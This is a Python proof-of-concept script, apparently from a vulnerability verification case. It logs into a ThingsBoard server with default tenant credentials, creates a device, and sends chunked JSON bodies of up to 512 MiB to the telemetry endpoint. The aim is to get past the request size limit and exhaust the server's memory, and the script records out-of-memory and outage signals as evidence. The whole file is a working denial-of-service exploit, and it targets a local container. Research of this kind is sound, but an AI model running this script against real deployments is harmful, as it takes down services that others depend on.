#!/usr/bin/env python3
import argparse
import csv
import http.client
import json
import os
import socket
import subprocess
import sys
import time
import uuid
from pathlib import Path
from urllib.parse import urlparse


CASE_DIR = Path(__file__).resolve().parent
LOG_DIR = CASE_DIR / "logs"
EVIDENCE_DIR = CASE_DIR / "evidence"
CONTAINER = "tb-dos-thingsboard-static-0002"


def run_cmd(args, timeout=10):
    try:
        return subprocess.run(args, text=True, capture_output=True, timeout=timeout)
    except subprocess.TimeoutExpired as exc:
        return subprocess.CompletedProcess(args, 124, exc.stdout or "", exc.stderr or "timeout")


def docker_state():
    cp = run_cmd([
        "docker", "inspect", "-f",
        "status={{.State.Status}} exit={{.State.ExitCode}} oom={{.State.OOMKilled}} error={{.State.Error}}",
        CONTAINER,
    ])
    return cp.stdout.strip() if cp.returncode == 0 else f"inspect_failed rc={cp.returncode} {cp.stderr.strip()}"


def docker_stats(path):
    cp = run_cmd([
        "docker", "stats", "--no-stream",
        "--format", "{{.Name}}\t{{.MemUsage}}\t{{.MemPerc}}\t{{.CPUPerc}}\t{{.PIDs}}",
        CONTAINER,
    ], timeout=12)
    path.write_text(cp.stdout + cp.stderr, encoding="utf-8")
    return cp.stdout.strip()


def jcmd_heap(path):
    cp = run_cmd(["docker", "exec", CONTAINER, "jcmd", "230", "GC.heap_info"], timeout=8)
    path.write_text(cp.stdout + cp.stderr, encoding="utf-8")
    return cp.returncode


def docker_logs_tail(path, lines=300):
    cp = run_cmd(["docker", "logs", "--tail", str(lines), CONTAINER], timeout=12)
    path.write_text(cp.stdout + cp.stderr, encoding="utf-8")
    return path


def http_json(method, base_url, path, body=None, token=None, timeout=30):
    url = urlparse(base_url)
    conn = http.client.HTTPConnection(url.hostname, url.port, timeout=timeout)
    headers = {"Content-Type": "application/json"}
    if token:
        headers["X-Authorization"] = f"Bearer {token}"
    payload = None if body is None else json.dumps(body).encode("utf-8")
    conn.request(method, path, body=payload, headers=headers)
    resp = conn.getresponse()
    data = resp.read()
    conn.close()
    try:
        parsed = json.loads(data.decode("utf-8")) if data else None
    except Exception:
        parsed = data[:300].decode("utf-8", errors="replace")
    return resp.status, parsed


def login(base_url, username, password):
    status, parsed = http_json("POST", base_url, "/api/auth/login", {
        "username": username,
        "password": password,
    })
    if status != 200 or not isinstance(parsed, dict) or "token" not in parsed:
        raise RuntimeError(f"login failed status={status} body={parsed!r}")
    return parsed["token"]


def create_device(base_url, token, name):
    status, parsed = http_json("POST", base_url, "/api/device", {
        "name": name,
        "type": "default",
    }, token=token)
    if status not in (200, 201) or not isinstance(parsed, dict):
        raise RuntimeError(f"device create failed status={status} body={parsed!r}")
    device_id = parsed.get("id", {}).get("id")
    if not device_id:
        raise RuntimeError(f"device create response missing id: {parsed!r}")
    return device_id, parsed


def delete_device(base_url, token, device_id):
    try:
        status, parsed = http_json("DELETE", base_url, f"/api/device/{device_id}", token=token, timeout=20)
        return {"status": status, "body": parsed}
    except Exception as exc:
        return {"error": repr(exc)}


def availability(base_url):
    try:
        url = urlparse(base_url)
        conn = http.client.HTTPConnection(url.hostname, url.port, timeout=5)
        conn.request("GET", "/api/auth/login")
        resp = conn.getresponse()
        resp.read()
        conn.close()
        return {"ok": True, "status": resp.status}
    except Exception as exc:
        return {"ok": False, "error": repr(exc)}


def make_json_bytes(target_bytes, value_len=80):
    chunks = []
    total = 1
    chunks.append(b"{")
    idx = 0
    first = True
    while total + 2 < target_bytes:
        prefix = b"" if first else b","
        key = f"k{idx:010d}".encode("ascii")
        overhead = len(prefix) + 1 + len(key) + 3
        remaining = target_bytes - total - 1
        if remaining <= overhead:
            break
        this_value_len = min(value_len, remaining - overhead)
        entry = prefix + b"\"" + key + b"\":\"" + (b"a" * this_value_len) + b"\""
        chunks.append(entry)
        total += len(entry)
        idx += 1
        first = False
    chunks.append(b"}")
    return b"".join(chunks)


def iter_json_chunks(target_bytes, value_len=80, flush_bytes=65536):
    total = 1
    idx = 0
    first = True
    buf = bytearray(b"{")
    while total + 2 < target_bytes:
        prefix = b"" if first else b","
        key = f"k{idx:010d}".encode("ascii")
        overhead = len(prefix) + 1 + len(key) + 3
        remaining = target_bytes - total - 1
        if remaining <= overhead:
            break
        this_value_len = min(value_len, remaining - overhead)
        entry = prefix + b"\"" + key + b"\":\"" + (b"a" * this_value_len) + b"\""
        if len(buf) + len(entry) >= flush_bytes:
            yield bytes(buf)
            buf.clear()
        buf.extend(entry)
        total += len(entry)
        idx += 1
        first = False
    buf.extend(b"}")
    if buf:
        yield bytes(buf)


def post_content_length(base_url, path, token, target_bytes, value_len, timeout=120):
    url = urlparse(base_url)
    body = make_json_bytes(target_bytes, value_len=value_len)
    conn = http.client.HTTPConnection(url.hostname, url.port, timeout=timeout)
    headers = {
        "Content-Type": "application/json",
        "X-Authorization": f"Bearer {token}",
        "Content-Length": str(len(body)),
    }
    started = time.time()
    try:
        conn.request("POST", path, body=body, headers=headers)
        resp = conn.getresponse()
        data = resp.read()
        elapsed = time.time() - started
        conn.close()
        return {
            "status": resp.status,
            "reason": resp.reason,
            "bytes": len(body),
            "elapsed_seconds": round(elapsed, 3),
            "response_excerpt": data[:300].decode("utf-8", errors="replace"),
            "client_error": None,
        }
    except (BrokenPipeError, ConnectionResetError, http.client.HTTPException, socket.timeout, OSError) as exc:
        elapsed = time.time() - started
        try:
            conn.close()
        except Exception:
            pass
        return {
            "status": None,
            "reason": None,
            "bytes": len(body),
            "elapsed_seconds": round(elapsed, 3),
            "response_excerpt": "",
            "client_error": repr(exc),
        }


def post_chunked(base_url, path, token, target_bytes, value_len, timeout=360):
    url = urlparse(base_url)
    conn = http.client.HTTPConnection(url.hostname, url.port, timeout=timeout)
    started = time.time()
    sent = 0
    try:
        conn.putrequest("POST", path, skip_host=True, skip_accept_encoding=True)
        conn.putheader("Host", f"{url.hostname}:{url.port}")
        conn.putheader("Content-Type", "application/json")
        conn.putheader("X-Authorization", f"Bearer {token}")
        conn.putheader("Transfer-Encoding", "chunked")
        conn.endheaders()
        for chunk in iter_json_chunks(target_bytes, value_len=value_len):
            sent += len(chunk)
            conn.sock.sendall(f"{len(chunk):X}\r\n".encode("ascii"))
            conn.sock.sendall(chunk)
            conn.sock.sendall(b"\r\n")
        conn.sock.sendall(b"0\r\n\r\n")
        resp = conn.getresponse()
        data = resp.read()
        elapsed = time.time() - started
        conn.close()
        return {
            "status": resp.status,
            "reason": resp.reason,
            "bytes": sent,
            "elapsed_seconds": round(elapsed, 3),
            "response_excerpt": data[:500].decode("utf-8", errors="replace"),
            "client_error": None,
        }
    except (BrokenPipeError, ConnectionResetError, http.client.HTTPException, socket.timeout, OSError) as exc:
        elapsed = time.time() - started
        try:
            conn.close()
        except Exception:
            pass
        return {
            "status": None,
            "reason": None,
            "bytes": sent,
            "elapsed_seconds": round(elapsed, 3),
            "response_excerpt": "",
            "client_error": repr(exc),
        }


def logs_contain_oom(path):
    text = path.read_text(encoding="utf-8", errors="replace") if path.exists() else ""
    needles = ["OutOfMemoryError", "Java heap space", "GC overhead", "Killed", "OOMKilled"]
    return any(n in text for n in needles), [n for n in needles if n in text]


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:19090")
    parser.add_argument("--username", default="tenant@thingsboard.org")
    parser.add_argument("--password", default="tenant")
    parser.add_argument("--sizes-mib", default="1,17,64,128,256,384,512")
    parser.add_argument("--control-mib", type=int, default=17)
    parser.add_argument("--endpoint", choices=("attributes", "timeseries"), default="attributes")
    parser.add_argument("--value-len", type=int, default=8192)
    args = parser.parse_args()

    LOG_DIR.mkdir(exist_ok=True)
    EVIDENCE_DIR.mkdir(exist_ok=True)

    events_path = LOG_DIR / "probe_events.jsonl"
    results_path = EVIDENCE_DIR / "http_results.csv"
    summary_path = EVIDENCE_DIR / "probe_summary.json"
    events = events_path.open("w", encoding="utf-8")

    def event(obj):
        obj["ts"] = time.strftime("%Y-%m-%dT%H:%M:%S%z")
        events.write(json.dumps(obj, sort_keys=True) + "\n")
        events.flush()
        print(json.dumps(obj, sort_keys=True), flush=True)

    summary = {
        "base_url": args.base_url,
        "container": CONTAINER,
        "account_used": args.username,
        "device_id": None,
        "control_result": None,
        "chunked_results": [],
        "confirmed_failure_signal": "none",
        "observed_chunked_over_limit": False,
        "cleanup": None,
    }

    token = None
    device_id = None
    try:
        docker_stats(LOG_DIR / "docker_stats_probe_baseline.txt")
        jcmd_heap(LOG_DIR / "jcmd_heap_probe_baseline.txt")
        event({"phase": "login_start", "account": args.username, "docker_state": docker_state()})
        token = login(args.base_url, args.username, args.password)
        device_name = "dos-static-0002-" + uuid.uuid4().hex[:10]
        device_id, device_json = create_device(args.base_url, token, device_name)
        summary["device_id"] = device_id
        (EVIDENCE_DIR / "created_device_redacted.json").write_text(json.dumps({
            "name": device_name,
            "id": device_id,
            "created_time": device_json.get("createdTime"),
            "type": device_json.get("type"),
        }, indent=2) + "\n", encoding="utf-8")
        event({"phase": "device_created", "device_id": device_id, "device_name": device_name})

        if args.endpoint == "attributes":
            path = f"/api/plugins/telemetry/DEVICE/{device_id}/SERVER_SCOPE"
        else:
            path = f"/api/plugins/telemetry/DEVICE/{device_id}/timeseries/ANY"
        with results_path.open("w", encoding="utf-8", newline="") as f:
            writer = csv.DictWriter(f, fieldnames=[
                "phase", "size_mib", "status", "reason", "bytes", "elapsed_seconds",
                "client_error", "response_excerpt", "docker_state_after", "availability_ok",
                "availability_status", "availability_error", "stats_file", "heap_file", "log_file",
            ])
            writer.writeheader()

            event({"phase": "content_length_control_start", "size_mib": args.control_mib, "path": path})
            control = post_content_length(args.base_url, path, token, args.control_mib * 1024 * 1024, args.value_len)
            stats_file = LOG_DIR / "docker_stats_after_content_length_control.txt"
            heap_file = LOG_DIR / "jcmd_heap_after_content_length_control.txt"
            log_file = LOG_DIR / "logs_after_content_length_control.txt"
            docker_stats(stats_file)
            jcmd_heap(heap_file)
            docker_logs_tail(log_file)
            avail = availability(args.base_url)
            control_row = {
                "phase": "content_length_control",
                "size_mib": args.control_mib,
                "status": control.get("status"),
                "reason": control.get("reason"),
                "bytes": control.get("bytes"),
                "elapsed_seconds": control.get("elapsed_seconds"),
                "client_error": control.get("client_error") or "",
                "response_excerpt": control.get("response_excerpt") or "",
                "docker_state_after": docker_state(),
                "availability_ok": avail.get("ok"),
                "availability_status": avail.get("status"),
                "availability_error": avail.get("error"),
                "stats_file": str(stats_file.relative_to(CASE_DIR)),
                "heap_file": str(heap_file.relative_to(CASE_DIR)),
                "log_file": str(log_file.relative_to(CASE_DIR)),
            }
            writer.writerow(control_row)
            f.flush()
            summary["control_result"] = control_row
            event({"phase": "content_length_control_done", **control_row})

            for size_mib in [int(x) for x in args.sizes_mib.split(",") if x.strip()]:
                bytes_target = size_mib * 1024 * 1024
                event({"phase": "chunked_start", "size_mib": size_mib, "path": path, "docker_state": docker_state()})
                result = post_chunked(args.base_url, path, token, bytes_target, args.value_len)
                stats_file = LOG_DIR / f"docker_stats_after_chunked_{size_mib}mib.txt"
                heap_file = LOG_DIR / f"jcmd_heap_after_chunked_{size_mib}mib.txt"
                log_file = LOG_DIR / f"logs_after_chunked_{size_mib}mib.txt"
                docker_stats(stats_file)
                jcmd_heap(heap_file)
                docker_logs_tail(log_file, lines=500)
                avail = availability(args.base_url)
                state_after = docker_state()
                row = {
                    "phase": "chunked",
                    "size_mib": size_mib,
                    "status": result.get("status"),
                    "reason": result.get("reason"),
                    "bytes": result.get("bytes"),
                    "elapsed_seconds": result.get("elapsed_seconds"),
                    "client_error": result.get("client_error") or "",
                    "response_excerpt": result.get("response_excerpt") or "",
                    "docker_state_after": state_after,
                    "availability_ok": avail.get("ok"),
                    "availability_status": avail.get("status"),
                    "availability_error": avail.get("error"),
                    "stats_file": str(stats_file.relative_to(CASE_DIR)),
                    "heap_file": str(heap_file.relative_to(CASE_DIR)),
                    "log_file": str(log_file.relative_to(CASE_DIR)),
                }
                writer.writerow(row)
                f.flush()
                summary["chunked_results"].append(row)
                if size_mib > 16 and row["status"] != 413:
                    summary["observed_chunked_over_limit"] = True
                oom_seen, needles = logs_contain_oom(log_file)
                if "oom=true" in state_after or oom_seen:
                    summary["confirmed_failure_signal"] = "OutOfMemoryError" if oom_seen else "Docker OOMKilled"
                    event({"phase": "failure_detected", "size_mib": size_mib, "needles": needles, **row})
                    break
                if not avail.get("ok") or state_after.startswith("status=exited"):
                    time.sleep(10)
                    second_avail = availability(args.base_url)
                    second_state = docker_state()
                    if not second_avail.get("ok") or second_state.startswith("status=exited"):
                        summary["confirmed_failure_signal"] = "sustained_http_unavailable"
                        event({"phase": "failure_detected", "size_mib": size_mib, "second_availability": second_avail, "second_state": second_state, **row})
                        break
                event({"phase": "chunked_done", **row})
        return_code = 0
    except Exception as exc:
        summary["error"] = repr(exc)
        event({"phase": "probe_error", "error": repr(exc), "docker_state": docker_state()})
        return_code = 2
    finally:
        if token and device_id:
            summary["cleanup"] = delete_device(args.base_url, token, device_id)
            event({"phase": "device_cleanup", "device_id": device_id, "cleanup": summary["cleanup"]})
        docker_logs_tail(LOG_DIR / "logs_probe_final_tail.txt", lines=800)
        docker_stats(LOG_DIR / "docker_stats_probe_final.txt")
        jcmd_heap(LOG_DIR / "jcmd_heap_probe_final.txt")
        (LOG_DIR / "container_state_probe_final.txt").write_text(docker_state() + "\n", encoding="utf-8")
        summary_path.write_text(json.dumps(summary, indent=2, sort_keys=True) + "\n", encoding="utf-8")
        events.close()
    return return_code


if __name__ == "__main__":
    sys.exit(main())
